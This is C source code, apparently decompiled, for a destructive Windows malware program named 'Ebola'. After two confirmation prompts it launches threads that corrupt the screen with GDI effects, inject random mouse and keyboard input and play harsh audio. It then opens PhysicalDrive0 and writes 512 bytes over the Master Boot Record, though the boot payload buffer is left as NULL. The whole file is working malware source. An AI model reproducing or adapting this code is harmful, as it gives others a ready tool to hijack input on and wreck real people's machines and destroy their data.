#include <windows.h>
#include <time.h>
#pragma comment(lib, "Winmm.lib")
#define LODWORD(x) (*((unsigned int*)&(x)))
void __fastcall StartAddress(LPVOID lpThreadParameter)
{
    unsigned int v1; // eax
    LONG v2; // esi
    int v3; // er14
    HDC v4; // rbp
    int v5; // ebx
    int v6; // edi
    int v7; // eax
    HBRUSH v8; // rax
    int v9; // er15
    int v10; // er12
    int v11; // er13
    int v12; // ebx
    HRGN v13; // rsi
    HRGN v14; // rdi
    int v15; // [rsp+50h] [rbp-88h]
    int h; // [rsp+54h] [rbp-84h]
    int w; // [rsp+58h] [rbp-80h]
    HDC ho; // [rsp+60h] [rbp-78h]
    HBITMAP v19; // [rsp+68h] [rbp-70h]
    void* ppvBits; // [rsp+70h] [rbp-68h]
    BITMAPINFO pbmi; // [rsp+78h] [rbp-60h]

    v1 = time(0);
    srand(v1);
    w = GetSystemMetrics(0);
    v2 = w;
    v3 = GetSystemMetrics(1);
    h = v3;
    while (1)
    {
        RedrawWindow(0i64, 0i64, 0i64, 0x85u);
        pbmi.bmiHeader.biSize = 40;
        pbmi.bmiHeader.biWidth = v2;
        pbmi.bmiHeader.biHeight = v3;
        *(DWORD*)&pbmi.bmiHeader.biPlanes = 5439493;
        *(WORD*)&pbmi.bmiColors[0].rgbGreen = 517;
        pbmi.bmiColors[0].rgbBlue = 9;
        v4 = GetDC(0i64);
        ho = CreateCompatibleDC(v4);
        v19 = CreateDIBSection(v4, &pbmi, 0, &ppvBits, 0i64, 0);
        SelectObject(ho, v19);
        BitBlt(ho, 0, 0, v2, v3, v4, 0, 0, 0xCC0020u);
        v5 = (unsigned __int8)(rand() % 100) << 8;
        v6 = v5 | ((unsigned __int8)(rand() % 100) << 16);
        v7 = rand();
        v8 = CreateSolidBrush(v6 | (unsigned int)(unsigned __int8)(v7 % 100));
        SelectObject(v4, v8);
        v9 = rand() % v2;
        v10 = rand() % v3;
        v11 = rand() % v2;
        v12 = 5;
        v15 = rand() % v3;
        do
        {
            Sleep(0xAu);
            v13 = CreateEllipticRgn(v9 - v9 / v12, v10 + v10 / v12, 0x7D0u / v12 + v9, v10 - 0x3B6u / v12);
            v14 = CreateRectRgn(v11 - v11 / v12, v15 + v15 / v12, 0x7D0u / v12 + v11, v15 - 0x3B6u / v12);
            InvertRgn(v4, v13);
            InvertRgn(v4, v14);
            v2 = w;
            v3 = h;
            PatBlt(v4, 0, 0, w, h, 0x5A0049u);
            ++v12;
        } while (v12 < 16);
        DeleteObject(v4);
        DeleteObject(ho);
        DeleteObject(v19);
    }
}
void __fastcall sub_140001600(LPVOID lpThreadParameter)
{
    HWND v1; // rbx
    HDC v2; // rdi
    struct tagRECT Rect; // [rsp+50h] [rbp-38h]
    POINT Point; // [rsp+60h] [rbp-28h]
    int v5; // [rsp+68h] [rbp-20h]
    LONG v6; // [rsp+6Ch] [rbp-1Ch]
    int v7; // [rsp+70h] [rbp-18h]
    int v8; // [rsp+74h] [rbp-14h]

    while (1)
    {
        v1 = GetForegroundWindow();
        GetWindowDC(v1);
        v2 = GetDC(0i64);
        GetWindowRect(v1, &Rect);
        GetSystemMetrics(0);
        GetSystemMetrics(1);
        Point.y = Rect.top + 10;
        v5 = Rect.right - 10;
        Point.x = Rect.left + 10;
        v7 = Rect.left + 10;
        v6 = Rect.top;
        v8 = Rect.bottom - 10;
        PlgBlt(v2, &Point, v2, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0i64, 0, 0);
    }
}
void __fastcall sub_1400016E0(LPVOID lpThreadParameter)
{
    HDC v1; // r14
    int v2; // ebp
    int h; // esi
    int v4; // ebx
    int v5; // edi
    int v6; // eax
    HBRUSH v7; // rax
    int v8; // eax

    while (1)
    {
        v1 = GetDC(0i64);
        v2 = GetSystemMetrics(0);
        h = GetSystemMetrics(1);
        v4 = (unsigned __int8)(rand() % 75) << 8;
        v5 = v4 | ((unsigned __int8)(rand() % 75) << 16);
        v6 = rand();
        v7 = CreateSolidBrush(v5 | (unsigned int)(unsigned __int8)(v6 % 75));
        SelectObject(v1, v7);
        PatBlt(v1, 0, 0, v2, h, 0x5A0049u);
        v8 = rand();
        Sleep(v8 % 1000);
    }
}
void __fastcall sub_140001160(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rdi
    int wSrc; // esi
    int v3; // ebx
    int hDest; // ebx

    while (1)
    {
        hdcSrc = GetDC(0i64);
        wSrc = GetSystemMetrics(0);
        v3 = GetSystemMetrics(1);
        hDest = rand() % v3;
        if (rand() % 2)
        {
            if (rand() % 2 == 1)
                StretchBlt(hdcSrc, 0, hDest, wSrc, hDest, hdcSrc, 20, hDest, wSrc + 30, hDest, 0xCC0020u);
        }
        else
        {
            StretchBlt(hdcSrc, 20, hDest, wSrc + 30, hDest, hdcSrc, 0, hDest, wSrc, hDest, 0xCC0020u);
        }
    }
}
void __fastcall sub_140001250(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rdi
    int v2; // ebx
    int cy; // esi
    int x1; // ebx

    while (1)
    {
        hdcSrc = GetDC(0i64);
        v2 = GetSystemMetrics(0);
        cy = GetSystemMetrics(1);
        x1 = rand() % v2;
        if (rand() % 2)
        {
            if (!(rand() % 2))
                BitBlt(hdcSrc, x1, -20, -200, cy, hdcSrc, x1, 0, 0xCC0020u);
        }
        else
        {
            BitBlt(hdcSrc, x1, 20, 200, cy, hdcSrc, x1, 0, 0xCC0020u);
        }
    }
}
void __fastcall sub_140001800(LPVOID lpThreadParameter)
{
    int v1; // eax

    while (1)
    {
        rand();
        rand();
        v1 = rand();
        Sleep(v1 % 100);
    }
}
void __fastcall sub_140001840(LPVOID lpThreadParameter)
{
    int v1; // edi
    int v2; // eax
    int v3; // ebx
    int v4; // ebx
    int v5; // eax
    struct tagINPUT pInputs; // [rsp+30h] [rbp-38h]

    while (1)
    {
        v1 = GetSystemMetrics(0);
        v2 = GetSystemMetrics(1);
        pInputs.type = 0;
        pInputs.mi.dwFlags = 2;
        v3 = v2;
        SendInput(2u, &pInputs, 40);
        pInputs.type = 0;
        pInputs.mi.dwFlags = 4;
        SendInput(2u, &pInputs, 40);
        v4 = rand() % v3;
        v5 = rand();
        SetCursorPos(v5 % v1, v4);
        keybd_event(8u, 0, 0, 0i64);
        keybd_event(9u, 0, 0, 0i64);
        keybd_event(0xDu, 0, 0, 0i64);
        keybd_event(0x10u, 0, 0, 0i64);
        keybd_event(0x11u, 0, 0, 0i64);
        keybd_event(0x12u, 0, 0, 0i64);
        keybd_event(0x13u, 0, 0, 0i64);
        keybd_event(0x14u, 0, 0, 0i64);
        keybd_event(0x20u, 0, 0, 0i64);
        keybd_event(0x21u, 0, 0, 0i64);
        keybd_event(0x22u, 0, 0, 0i64);
        keybd_event(0x26u, 0, 0, 0i64);
        mouse_event(0x800u, 0, 0, 0x78u, 0i64);
        mouse_event(0x800u, 0, 0, 0xFFFFFF88, 0i64);
    }
}
void __fastcall sub_140001CC0(LPVOID lpThreadParameter)
{
    HDC hdcSrc; // rbx
    int wSrc; // edi
    int hSrc; // esi
    int v4; // eax

    hdcSrc = GetDC(0i64);
    wSrc = GetSystemMetrics(0);
    hSrc = GetSystemMetrics(1);
    while (1)
    {
        StretchBlt(hdcSrc, -10, -10, wSrc + 20, hSrc + 20, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u);
        v4 = rand();
        Sleep(v4 % 1000);
    }
}
void __fastcall sub_140001D70(LPVOID lpThreadParameter)
{
    HDC v1; // rsi
    int v2; // ebp
    int v3; // er14
    int v4; // eax
    int v5; // ebx
    int v6; // eax
    int v7; // edi
    int v8; // eax
    HBRUSH v9; // rax
    int v10; // ebx
    int v11; // eax
    int v12; // ebx
    int v13; // eax
    int v14; // ebx
    int v15; // eax
    int v16; // ebx
    int v17; // eax
    int v18; // ebx
    int v19; // eax
    int v20; // ebx
    int v21; // eax
    int v22; // ebx
    int v23; // eax
    int v24; // ebx
    int v25; // eax
    int v26; // ebx
    int v27; // eax
    int v28; // ebx
    int v29; // eax
    int v30; // ebx
    int v31; // eax
    int v32; // ebx
    int v33; // eax
    int v34; // ebx
    int v35; // eax
    int v36; // ebx
    int v37; // eax
    int v38; // ebx
    int v39; // eax
    int v40; // ebx
    int v41; // eax
    int v42; // ebx
    int v43; // eax
    int v44; // ebx
    int v45; // eax
    int v46; // ebx
    int v47; // eax
    int v48; // ebx
    int v49; // eax
    int v50; // ebx
    int v51; // eax
    int v52; // ebx
    int v53; // eax
    int v54; // ebx
    int v55; // eax
    int v56; // ebx
    int v57; // eax
    int v58; // ebx
    int v59; // eax
    int v60; // ebx
    int v61; // eax
    int v62; // ebx
    int v63; // eax
    int v64; // ebx
    int v65; // eax
    int v66; // ebx
    int v67; // eax
    int v68; // ebx
    int v69; // eax
    int v70; // ebx
    int v71; // eax
    int v72; // ebx
    int v73; // eax
    int v74; // ebx
    int v75; // eax
    int v76; // ebx
    int v77; // eax
    int v78; // ebx
    int v79; // eax
    int v80; // ebx
    int v81; // eax
    int v82; // ebx
    int v83; // eax
    int v84; // ebx
    int v85; // eax
    int v86; // ebx
    int v87; // eax
    int v88; // ebx
    int v89; // eax
    int v90; // ebx
    int v91; // eax
    int v92; // ebx
    int v93; // eax
    int v94; // ebx
    int v95; // eax
    int v96; // ebx
    int v97; // eax
    int v98; // ebx
    int v99; // eax
    int v100; // ebx
    int v101; // eax
    int v102; // ebx
    int v103; // eax
    int v104; // ebx
    int v105; // eax
    int v106; // ebx
    int v107; // eax
    int v108; // ebx
    int v109; // eax
    int v110; // ebx
    int v111; // eax
    int v112; // ebx
    int v113; // eax
    int v114; // ebx
    int v115; // eax
    int v116; // ebx
    int v117; // eax
    int v118; // ebx
    int v119; // eax
    int v120; // ebx
    int v121; // eax
    int v122; // ebx
    int v123; // eax
    int v124; // ebx
    int v125; // eax
    int v126; // ebx
    int v127; // eax
    int v128; // ebx
    int v129; // eax
    int v130; // ebx
    int v131; // eax

    v1 = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    v3 = GetSystemMetrics(1);
    while (1)
    {
        v4 = rand();
        v5 = (unsigned __int8)(v4 + v4 / 255) << 8;
        v6 = rand();
        v7 = v5 | ((unsigned __int8)(v6 + v6 / 255) << 16);
        v8 = rand();
        v9 = CreateSolidBrush(v7 | (unsigned int)(unsigned __int8)(v8 % 255));
        SelectObject(v1, v9);
        v10 = rand() % v3;
        v11 = rand();
        LineTo(v1, v11 % v2, v10);
        v12 = rand() % v3;
        v13 = rand();
        LineTo(v1, v13 % v2, v12);
        v14 = rand() % v3;
        v15 = rand();
        LineTo(v1, v15 % v2, v14);
        v16 = rand() % v3;
        v17 = rand();
        LineTo(v1, v17 % v2, v16);
        v18 = rand() % v3;
        v19 = rand();
        LineTo(v1, v19 % v2, v18);
        v20 = rand() % v3;
        v21 = rand();
        LineTo(v1, v21 % v2, v20);
        v22 = rand() % v3;
        v23 = rand();
        LineTo(v1, v23 % v2, v22);
        v24 = rand() % v3;
        v25 = rand();
        LineTo(v1, v25 % v2, v24);
        v26 = rand() % v3;
        v27 = rand();
        LineTo(v1, v27 % v2, v26);
        v28 = rand() % v3;
        v29 = rand();
        LineTo(v1, v29 % v2, v28);
        v30 = rand() % v3;
        v31 = rand();
        LineTo(v1, v31 % v2, v30);
        v32 = rand() % v3;
        v33 = rand();
        LineTo(v1, v33 % v2, v32);
        v34 = rand() % v3;
        v35 = rand();
        LineTo(v1, v35 % v2, v34);
        v36 = rand() % v3;
        v37 = rand();
        LineTo(v1, v37 % v2, v36);
        v38 = rand() % v3;
        v39 = rand();
        LineTo(v1, v39 % v2, v38);
        v40 = rand() % v3;
        v41 = rand();
        LineTo(v1, v41 % v2, v40);
        v42 = rand() % v3;
        v43 = rand();
        LineTo(v1, v43 % v2, v42);
        v44 = rand() % v3;
        v45 = rand();
        LineTo(v1, v45 % v2, v44);
        v46 = rand() % v3;
        v47 = rand();
        LineTo(v1, v47 % v2, v46);
        v48 = rand() % v3;
        v49 = rand();
        LineTo(v1, v49 % v2, v48);
        v50 = rand() % v3;
        v51 = rand();
        LineTo(v1, v51 % v2, v50);
        v52 = rand() % v3;
        v53 = rand();
        LineTo(v1, v53 % v2, v52);
        v54 = rand() % v3;
        v55 = rand();
        LineTo(v1, v55 % v2, v54);
        v56 = rand() % v3;
        v57 = rand();
        LineTo(v1, v57 % v2, v56);
        v58 = rand() % v3;
        v59 = rand();
        LineTo(v1, v59 % v2, v58);
        v60 = rand() % v3;
        v61 = rand();
        LineTo(v1, v61 % v2, v60);
        v62 = rand() % v3;
        v63 = rand();
        LineTo(v1, v63 % v2, v62);
        v64 = rand() % v3;
        v65 = rand();
        LineTo(v1, v65 % v2, v64);
        v66 = rand() % v3;
        v67 = rand();
        LineTo(v1, v67 % v2, v66);
        v68 = rand() % v3;
        v69 = rand();
        LineTo(v1, v69 % v2, v68);
        v70 = rand() % v3;
        v71 = rand();
        LineTo(v1, v71 % v2, v70);
        v72 = rand() % v3;
        v73 = rand();
        LineTo(v1, v73 % v2, v72);
        v74 = rand() % v3;
        v75 = rand();
        LineTo(v1, v75 % v2, v74);
        v76 = rand() % v3;
        v77 = rand();
        LineTo(v1, v77 % v2, v76);
        v78 = rand() % v3;
        v79 = rand();
        LineTo(v1, v79 % v2, v78);
        v80 = rand() % v3;
        v81 = rand();
        LineTo(v1, v81 % v2, v80);
        v82 = rand() % v3;
        v83 = rand();
        LineTo(v1, v83 % v2, v82);
        v84 = rand() % v3;
        v85 = rand();
        LineTo(v1, v85 % v2, v84);
        v86 = rand() % v3;
        v87 = rand();
        LineTo(v1, v87 % v2, v86);
        v88 = rand() % v3;
        v89 = rand();
        LineTo(v1, v89 % v2, v88);
        v90 = rand() % v3;
        v91 = rand();
        LineTo(v1, v91 % v2, v90);
        v92 = rand() % v3;
        v93 = rand();
        LineTo(v1, v93 % v2, v92);
        v94 = rand() % v3;
        v95 = rand();
        LineTo(v1, v95 % v2, v94);
        v96 = rand() % v3;
        v97 = rand();
        LineTo(v1, v97 % v2, v96);
        v98 = rand() % v3;
        v99 = rand();
        LineTo(v1, v99 % v2, v98);
        v100 = rand() % v3;
        v101 = rand();
        LineTo(v1, v101 % v2, v100);
        v102 = rand() % v3;
        v103 = rand();
        LineTo(v1, v103 % v2, v102);
        v104 = rand() % v3;
        v105 = rand();
        LineTo(v1, v105 % v2, v104);
        v106 = rand() % v3;
        v107 = rand();
        LineTo(v1, v107 % v2, v106);
        v108 = rand() % v3;
        v109 = rand();
        LineTo(v1, v109 % v2, v108);
        v110 = rand() % v3;
        v111 = rand();
        LineTo(v1, v111 % v2, v110);
        v112 = rand() % v3;
        v113 = rand();
        LineTo(v1, v113 % v2, v112);
        v114 = rand() % v3;
        v115 = rand();
        LineTo(v1, v115 % v2, v114);
        v116 = rand() % v3;
        v117 = rand();
        LineTo(v1, v117 % v2, v116);
        v118 = rand() % v3;
        v119 = rand();
        LineTo(v1, v119 % v2, v118);
        v120 = rand() % v3;
        v121 = rand();
        LineTo(v1, v121 % v2, v120);
        v122 = rand() % v3;
        v123 = rand();
        LineTo(v1, v123 % v2, v122);
        v124 = rand() % v3;
        v125 = rand();
        LineTo(v1, v125 % v2, v124);
        v126 = rand() % v3;
        v127 = rand();
        LineTo(v1, v127 % v2, v126);
        v128 = rand() % v3;
        v129 = rand();
        LineTo(v1, v129 % v2, v128);
        v130 = rand() % v3;
        v131 = rand();
        LineTo(v1, v131 % v2, v130);
        Sleep(0x64u);
    }
}
__int64 __fastcall sub_140001A00(LPVOID lpThreadParameter)
{
    HDC v1; // r13
    HWND v2; // rax
    int v3; // er14
    int h; // er15
    HDC v5; // r12
    HBRUSH v6; // rbx
    int i; // ebx
    int j; // ebp
    ULONGLONG v9; // rdi
    DWORD v10; // eax
    HBRUSH v11; // rsi
    DWORD v12; // eax
    int y1; // ebx
    DWORD v14; // eax
    HBITMAP ho; // [rsp+58h] [rbp-50h]
    struct tagRECT Rect; // [rsp+60h] [rbp-48h]

    v1 = GetDC(0i64);
    v2 = GetDesktopWindow();
    GetWindowRect(v2, &Rect);
    v3 = Rect.right - Rect.left;
    h = Rect.bottom - Rect.top;
    v5 = CreateCompatibleDC(v1);
    ho = CreateCompatibleBitmap(v1, v3, h);
    SelectObject(v5, ho);
    v6 = CreateSolidBrush(0);
    SelectObject(v5, v6);
    PatBlt(v5, 0, 0, v3, h, 0xF00021u);
    DeleteObject(v6);
    BitBlt(v5, 0, 0, v3, h, v1, 0, 0, 0x660046u);
    for (i = 0; i < v3; i += v3)
    {
        for (j = 0; j < h; j += h)
        {
            v9 = GetTickCount64() % 0xFFFFFFFF;
            v10 = GetTickCount();
            v11 = CreateSolidBrush((unsigned int)v9 | v10);
            SelectObject(v5, v11);
            LODWORD(v9) = ~GetTickCount() % 0x21 + j;
            v12 = GetTickCount();
            PatBlt(v5, i + v12 % 0x21 - 16, v9 - 16, v3, h, 0x5A0049u);
            DeleteObject(v11);
        }
    }
    BitBlt(v1, 0, 0, v3, h, v5, 0, 0, 0xCC0020u);
    y1 = ~GetTickCount() % (2 * h) - h;
    v14 = GetTickCount();
    BitBlt(v1, 0, 0, v3, h, v5, v14 % (2 * v3) - v3, y1, 0x440328u);
    DeleteObject(ho);
    DeleteDC(v5);
    ReleaseDC(0i64, v1);
    return 0i64;
}
void __fastcall sub_140002640(LPVOID lpThreadParameter)
{
    HDC v1; // rdi
    int v2; // esi
    int v3; // ebp
    int v4; // ebx
    int v5; // eax
    struct tagCURSORINFO pci; // [rsp+20h] [rbp-28h]

    v1 = GetDC(0i64);
    v2 = GetSystemMetrics(0);
    v3 = GetSystemMetrics(1);
    while (1)
    {
        GetCursorInfo(&pci);
        pci.cbSize = 24;
        v4 = rand() % v3;
        v5 = rand();
        DrawIcon(v1, v5 % v2, v4, pci.hCursor);
    }
}
__int64 __fastcall sub_140001000(LPVOID lpThreadParameter)
{
    unsigned int v1; // eax
    char* v2; // r8
    char v3; // cl
    char v4; // dl
    HWAVEOUT phwo; // [rsp+30h] [rbp-D0h]
    struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h]
    WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h]
    char v9; // [rsp+80h] [rbp-80h]
    char v10; // [rsp+81h] [rbp-7Fh]

    *(DWORD*)&pwfx.wFormatTag = 65537;
    phwo = 0i64;
    pwfx.nSamplesPerSec = 8000;
    pwfx.nAvgBytesPerSec = 8000;
    *(DWORD*)&pwfx.nBlockAlign = 524289;
    pwfx.cbSize = 0;
    waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0i64, 0i64, 0);
    memset(&v10, 0, 0x752FFui64);
    v1 = 0;
    v2 = &v9;
    do
    {
        ++v2;
        v3 = v1;
        v4 = (v1 >> 5) | BYTE(v1);
        ++v1;
        *(v2 - 1) = v3 * v4;
    } while (v1 < 0x75300);
    pwh.lpData = &v9;
    *(__int64*)&pwh.dwBufferLength = 480000i64;
    pwh.dwUser = 0i64;
    *(__int64*)&pwh.dwFlags = 0i64;
    pwh.lpNext = 0i64;
    pwh.reserved = 0i64;
    waveOutPrepareHeader(phwo, &pwh, 0x30u);
    waveOutWrite(phwo, &pwh, 0x30u);
    waveOutUnprepareHeader(phwo, &pwh, 0x30u);
    waveOutClose(phwo);
    Sleep(0xEA60u);
    return 0i64;
}
int __cdecl main(int argc, const char** argv, const char** envp)
{
    HANDLE v3; // rbx
    DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-18h]

    if (MessageBoxA(
        0i64,
        "Your About To Run Ebola That Will Damage Your Machine And This WIll Not Be Distributeted To Not Destroy Any Rea"
        "l Life Machines! To Exit This Virus Press 'No' If Yo Want To Continue Press 'Yes' WARNING : This Virus Will Ove"
        "rwrite Your Master Boot Record |MBR|",
        "WARNING",
        0x34u) == 6
        && MessageBoxA(0i64, "DO YOU WANT TO CONTINUE LEADING TO A UNUSABLE AND UNSTABLE MACHINE?", "LAST WARNING", 0x34u) == 6)
    {
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001600, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_1400016E0, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001160, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001250, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001800, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001840, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001CC0, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001D70, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001A00, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002640, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140002640, 0i64, 0, 0i64);
        CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)sub_140001000, 0i64, 0, 0i64);
        v3 = CreateFileW(L"\\\\.\\PhysicalDrive0", 0x10000000u, 3u, 0i64, 3u, 0, 0i64);
        WriteFile(v3, NULL/*bootldr*/, 0x200u, &NumberOfBytesWritten, 0i64);
        CloseHandle(v3);
        while (1)
            ;
    }
    ExitProcess(0);
}